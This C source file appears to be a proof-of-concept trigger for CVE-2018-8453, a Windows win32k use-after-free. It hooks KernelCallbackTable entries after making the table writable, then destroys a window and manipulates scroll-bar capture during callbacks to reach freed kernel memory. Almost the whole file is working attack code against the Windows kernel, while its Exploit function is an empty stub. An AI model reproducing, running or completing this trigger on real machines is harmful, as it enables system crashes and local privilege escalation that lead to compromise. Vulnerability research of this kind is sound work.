#include "CVE-2018-8453.h"

EXTERN_C ULONG64 NtUserSetWindowFNID(HANDLE, UINT);

BOOL g_Flag_2018_8453 = FALSE;
HWND Window = NULL, ScrollBar = NULL, New_ScrollBar = NULL;
pFunc org_fnDWORD = NULL, org_xxxClientFreeWindowClassExtraBytes = NULL;

BOOL Exploit_CVE_2018_8453()
{
	BOOL bRet = TRUE;
	

exit:
	return bRet;
}

BOOL CreateWindows()
{
	BOOL bRet = TRUE;

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	char *szClassName = "MainWindow";
	WNDCLASS wc = { 0 };

	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = handle;
	wc.cbWndExtra = 8;
	wc.lpszClassName = szClassName;

	if (!RegisterClass(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClass", GetLastError());
		goto exit;
	}

	Window = CreateWindowEx(0, szClassName, NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!Window)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	SetWindowLong(Window, 0, (ULONG)Window);

	ScrollBar = CreateWindowEx(0, "SCROLLBAR", NULL, WS_CHILD | WS_VISIBLE | SBS_HORZ, NULL, NULL, 2, 2, Window, NULL, handle, NULL);
	if (!ScrollBar)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL HookFunc_CVE_2018_8453()
{
	BOOL bRet = TRUE;

	ULONG64 ulKernelCallBackTable = *(PULONG64)(GetPEB() + 0x58);

	DWORD dwOldProtect = 0;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	org_fnDWORD = (pFunc)*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x2);
	*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x2) = (ULONG64)My_fnDWORD;

	org_xxxClientFreeWindowClassExtraBytes = (pFunc)*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7E);
	*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7E) = (ULONG64)My_xxxCreateFreeWindowClassExtraBytes;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, dwOldProtect, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

LONG64 My_fnDWORD(PVOID arg0)
{
	if (g_Flag_2018_8453 && *(PDWORD)arg0)
	{
		g_Flag_2018_8453 = FALSE;
		DestroyWindow(Window);
	}

	if (*((PULONG64)arg0 + 1) == 0x70)
	{
		SendMessage(New_ScrollBar, WM_CANCELMODE, 0, 0);
	}

	return org_fnDWORD(arg0);
}

LONG64 My_xxxCreateFreeWindowClassExtraBytes(PVOID arg0)
{
	if ((*(HWND*)*(HWND*)arg0) == Window)
	{
		New_ScrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, SBS_HORZ | WS_HSCROLL | WS_VSCROLL, NULL, NULL, 2, 2, NULL, NULL, GetModuleHandleA(0), NULL);
		NtUserSetWindowFNID(Window, 0x2A1);
		SetCapture(New_ScrollBar);
	}

	return org_xxxClientFreeWindowClassExtraBytes(arg0);
}

BOOL POC_CVE_2018_8453()
{
	BOOL bRet = TRUE;

	if (!CreateWindows())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!HookFunc_CVE_2018_8453())
	{
		bRet = FALSE;
		goto exit;
	}

	g_Flag_2018_8453 = TRUE;
	SendMessageA(ScrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x00080008);

exit:
	return bRet;
}